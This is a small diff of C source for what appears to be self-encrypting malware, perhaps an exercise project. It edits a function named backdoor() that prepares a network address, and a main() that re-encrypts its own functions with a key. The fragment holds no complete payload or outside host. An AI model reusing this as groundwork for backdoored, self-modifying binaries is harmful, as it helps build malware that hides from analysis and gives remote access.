@@ -395,9 +395,9 @@ static void	backdoor()
 		write_ip(buf);
 		my_inet_aton(buf, &struct_addr_in.sin_addr);
 // 		size_t addr = 0x1234567890;
-// 		size_t end = (size_t)(&main + size_main);
+ 		size_t end = (size_t)(&main + MAIN_SIZE);
 // 		(void)addr;
-// 		(void)end;
+ 		(void)end;
 
 		// mprotect (addr, write | read)
 		// ft_memcpy(addr, ft_delete_and_loop, size_ft);
@@ -490,8 +490,3 @@ int		main(void)
 	reencrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], key);
 	return (0);
 }
-
-// void	ft_nothing()
-// {
-// 	return ;
-// }
